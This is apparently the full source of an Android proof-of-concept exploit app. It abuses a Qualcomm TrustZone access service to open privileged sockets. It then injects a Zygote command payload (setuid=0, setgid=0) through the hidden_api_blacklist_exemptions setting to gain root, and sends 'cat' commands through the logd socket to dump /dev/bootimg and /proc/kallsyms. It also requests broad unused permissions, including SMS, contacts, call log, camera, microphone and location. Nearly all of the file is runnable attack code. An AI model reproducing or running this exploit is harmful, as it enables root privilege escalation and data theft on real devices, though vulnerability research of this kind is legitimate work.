package com.example.tzpoc;

import android.Manifest;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.trustzoneaccess";
    private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";

    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final String HIDDEN_API_BLACKLIST_EXEMPTIONS = "hidden_api_blacklist_exemptions";
    private static final String HIDDEN_API_POLICY = "hidden_api_policy";

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private IMinkSocketFd mRemoteService;
    private boolean isBound = false;
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;

    private ServiceConnection serviceConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mRemoteService = IMinkSocketFd.Stub.asInterface(service);
            appendLog("Service bound");
            updateStatus("Bound - starting tests");
            enableButtons(false, true);
            stopRequested.set(false);
            testThread = new Thread(() -> executeFullTest());
            testThread.start();
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
            appendLog("Service disconnected");
            mRemoteService = null;
            isBound = false;
            enableButtons(true, false);
            updateStatus("Disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        requestNecessaryPermissions();

        btnStart.setOnClickListener(v -> {
            if (!isBound && !isTesting.get()) bindService();
        });
        btnStop.setOnClickListener(v -> {
            if (isBound || isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });
        appendLog("App started. Press 'Start' to begin.");
    }

    private void requestNecessaryPermissions() {
        List<String> needed = new ArrayList<>();
        needed.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        needed.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            needed.add(Manifest.permission.READ_MEDIA_IMAGES);
            needed.add(Manifest.permission.READ_MEDIA_VIDEO);
            needed.add(Manifest.permission.READ_MEDIA_AUDIO);
            needed.add(Manifest.permission.POST_NOTIFICATIONS);
        }
        needed.add(Manifest.permission.ACCESS_FINE_LOCATION);
        needed.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        needed.add(Manifest.permission.CAMERA);
        needed.add(Manifest.permission.RECORD_AUDIO);
        needed.add(Manifest.permission.READ_CONTACTS);
        needed.add(Manifest.permission.WRITE_CONTACTS);
        needed.add(Manifest.permission.READ_CALL_LOG);
        needed.add(Manifest.permission.WRITE_CALL_LOG);
        needed.add(Manifest.permission.READ_SMS);
        needed.add(Manifest.permission.SEND_SMS);
        needed.add(Manifest.permission.RECEIVE_SMS);

        List<String> toRequest = new ArrayList<>();
        for (String perm : needed) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(perm);
            }
        }
        if (!toRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                    appendLog("Granted: " + permissions[i]);
                } else {
                    appendLog("Denied: " + permissions[i] + " - some features may be limited");
                }
            }
        }
    }

    private void bindService() {
        try {
            Intent intent = new Intent();
            intent.setClassName(TARGET_PKG, TARGET_CLS);
            boolean ret = bindService(intent, serviceConnection, Context.BIND_AUTO_CREATE);
            if (ret) {
                appendLog("Binding service...");
                updateStatus("Binding...");
                isBound = true;
            } else {
                appendLog("bindService returned false");
                updateStatus("Bind failed");
                enableButtons(true, false);
            }
        } catch (Exception e) {
            appendLog("Bind exception: " + e.toString());
            updateStatus("Exception");
            enableButtons(true, false);
        }
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    private void executeFullTest() {
        isTesting.set(true);
        appendLog("========== CHECKING WRITE_SECURE_SETTINGS ==========");
        boolean hasSecure = checkAndGuideSecureSettings();

        if (hasSecure) {
            appendLog("WRITE_SECURE_SETTINGS is GRANTED! Proceeding with Zygote injection.");
            attemptZygoteInjection();
        } else {
            appendLog("WRITE_SECURE_SETTINGS NOT granted. Skipping Zygote injection.");
        }

        appendLog("========== DIRECT ZYGOTE SOCKET CONNECTION ==========");
        attemptDirectZygoteConnection();

        appendLog("========== DUMP FILES VIA LOGD ==========");
        dumpFilesViaLogd();

        appendLog("========== ALL TESTS COMPLETED ==========");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
    }

    private boolean checkAndGuideSecureSettings() {
        try {
            ContentResolver cr = getContentResolver();
            String test = Settings.Global.getString(cr, HIDDEN_API_BLACKLIST_EXEMPTIONS);
            appendLog("Settings readable (current value: " + (test != null ? test : "(null)") + ")");
            String original = test;
            Settings.Global.putString(cr, HIDDEN_API_BLACKLIST_EXEMPTIONS, "test");
            String newVal = Settings.Global.getString(cr, HIDDEN_API_BLACKLIST_EXEMPTIONS);
            if ("test".equals(newVal)) {
                Settings.Global.putString(cr, HIDDEN_API_BLACKLIST_EXEMPTIONS, original);
                return true;
            } else {
                appendLog("Write test failed - WRITE_SECURE_SETTINGS not granted.");
                showAdbGuideDialog();
                return false;
            }
        } catch (SecurityException e) {
            appendLog("SecurityException: " + e.getMessage());
            showAdbGuideDialog();
            return false;
        } catch (Exception e) {
            appendLog("Error: " + e.getMessage());
            return false;
        }
    }

    private void showAdbGuideDialog() {
        handler.post(() -> {
            new AlertDialog.Builder(this)
                .setTitle("WRITE_SECURE_SETTINGS 権限が必要")
                .setMessage("この権限はシステム権限のため、通常の許可ダイアログでは取得できません。\n\n" +
                            "PC に接続し、以下の ADB コマンドを実行してください：\n\n" +
                            "adb shell pm grant " + getPackageName() + 
                            " android.permission.WRITE_SECURE_SETTINGS\n\n" +
                            "実行後、アプリを再起動してください。")
                .setPositiveButton("OK", null)
                .show();
        });
    }

    private void attemptZygoteInjection() {
        appendLog("--- Zygote Injection via Settings ---");
        try {
            ContentResolver cr = getContentResolver();
            StringBuilder payload = new StringBuilder();
            int pad = 30;
            for (int i = 0; i < pad; i++) {
                payload.append("A");
            }
            payload.append("3\n");
            payload.append("--setuid=0\n");
            payload.append("--setgid=0\n");
            payload.append("--runtime-init\n");
            payload.append(",,,X");

            String malicious = payload.toString();
            appendLog("Setting malicious value: " + malicious.replace("\n", "\\n"));
            Settings.Global.putString(cr, HIDDEN_API_BLACKLIST_EXEMPTIONS, malicious);

            String oldPolicy = Settings.Global.getString(cr, HIDDEN_API_POLICY);
            Settings.Global.putString(cr, HIDDEN_API_POLICY, "1");
            Settings.Global.putString(cr, HIDDEN_API_POLICY, oldPolicy != null ? oldPolicy : "");
            appendLog("Triggered Zygote update. Check if a root process appeared.");

            Settings.Global.putString(cr, HIDDEN_API_BLACKLIST_EXEMPTIONS, "");
            appendLog("Cleared setting to avoid persistence.");
        } catch (Exception e) {
            appendLog("Zygote injection error: " + e.getMessage());
        }
    }

    private void attemptDirectZygoteConnection() {
        String zygotePath = "/dev/socket/zygote";
        appendLog("Trying direct connection to " + zygotePath);
        if (mRemoteService == null) return;
        ParcelFileDescriptor pfd = null;
        try {
            int[] iArr = new int[1];
            pfd = mRemoteService.a(zygotePath, iArr);
            if (pfd == null) {
                appendLog("  Direct connection failed (null FD)");
                return;
            }
            appendLog("  Got FD: " + iArr[0]);
            java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
            if (fdesc == null || !fdesc.valid()) {
                appendLog("  FD invalid");
                pfd.close();
                return;
            }
            OutputStream os = new FileOutputStream(fdesc);
            InputStream is = new FileInputStream(fdesc);
            String testCmd = "1\n--help\n";
            os.write(testCmd.getBytes(StandardCharsets.UTF_8));
            os.flush();
            String response = readWithTimeout(is, 500);
            if (response != null && !response.isEmpty()) {
                appendLog("  Zygote response: " + response);
            } else {
                appendLog("  No response (likely blocked by SELinux)");
            }
            pfd.close();
        } catch (Exception e) {
            appendLog("  Direct Zygote error: " + e.getMessage());
            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
        }
    }

    private void dumpFilesViaLogd() {
        String logdPath = "/dev/socket/logd";
        if (!tryConnect(logdPath)) {
            appendLog("logd not available, skipping file dumps");
            return;
        }
        String[] targets = {"/dev/bootimg", "/proc/kallsyms"};
        for (String filePath : targets) {
            if (stopRequested.get()) break;
            appendLog("Dumping " + filePath + " via logd...");
            ParcelFileDescriptor pfd = null;
            try {
                int[] iArr = new int[1];
                pfd = mRemoteService.a(logdPath, iArr);
                if (pfd == null) continue;
                java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
                if (fdesc == null || !fdesc.valid()) { pfd.close(); continue; }
                OutputStream os = new FileOutputStream(fdesc);
                InputStream is = new FileInputStream(fdesc);
                String cmd = "cat " + filePath + "\n";
                os.write(cmd.getBytes(StandardCharsets.UTF_8));
                os.flush();
                String resp = readWithTimeout(is, 2000);
                if (resp != null && !resp.isEmpty() && !resp.contains("No such file") && !resp.contains("Permission denied")) {
                    File out = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), new File(filePath).getName() + ".txt");
                    try (FileOutputStream fos = new FileOutputStream(out)) {
                        fos.write(resp.getBytes(StandardCharsets.UTF_8));
                    }
                    appendLog("  Saved to " + out.getAbsolutePath());
                } else {
                    appendLog("  No valid content.");
                }
                pfd.close();
            } catch (Exception e) {
                appendLog("  Error: " + e.getMessage());
                if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
            }
        }
    }

    private boolean tryConnect(String path) {
        if (mRemoteService == null) return false;
        try {
            int[] iArr = new int[1];
            ParcelFileDescriptor pfd = mRemoteService.a(path, iArr);
            if (pfd != null) {
                pfd.close();
                return true;
            }
        } catch (Exception ignored) {}
        return false;
    }

    private String readWithTimeout(InputStream is, int timeoutMs) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        long start = System.currentTimeMillis();
        byte[] buffer = new byte[4096];
        try {
            while (System.currentTimeMillis() - start < timeoutMs) {
                if (is.available() > 0) {
                    int len = is.read(buffer);
                    if (len > 0) {
                        baos.write(buffer, 0, len);
                    } else {
                        break;
                    }
                } else {
                    Thread.sleep(30);
                }
            }
            return baos.toString(StandardCharsets.UTF_8.name());
        } catch (Exception e) {
            return null;
        }
    }

    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) {
                ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
            }
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (!dir.exists() && !dir.mkdirs()) {
                appendLog("Cannot create Download dir");
                return;
            }
            File file = new File(dir, "final_poc_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== TZAccess Final PoC Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        if (isBound) {
            try { unbindService(serviceConnection); } catch (Exception ignored) {}
        }
        saveLog();
    }
}
